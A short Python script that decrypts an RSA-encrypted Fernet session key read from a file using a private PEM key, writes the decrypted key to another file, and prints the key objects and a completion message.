from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP




with open('email_key.txt', 'rb') as f:
    enc_fernet_key = f.read()
    print(enc_fernet_key)

# Private RSA key
private_key = RSA.import_key(open('./keys/private.pem').read())

# Private decrypter
private_crypter = PKCS1_OAEP.new(private_key)

# Decrypted session key
dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
with open('orca_key.txt', 'wb') as f:
    f.write(dec_fernet_key)

print(f'> Private key: {private_key}')
print(f'> Private decrypter: {private_crypter}')
print(f'> Decrypted fernet key: {dec_fernet_key}')
print('> Decryption Completed')

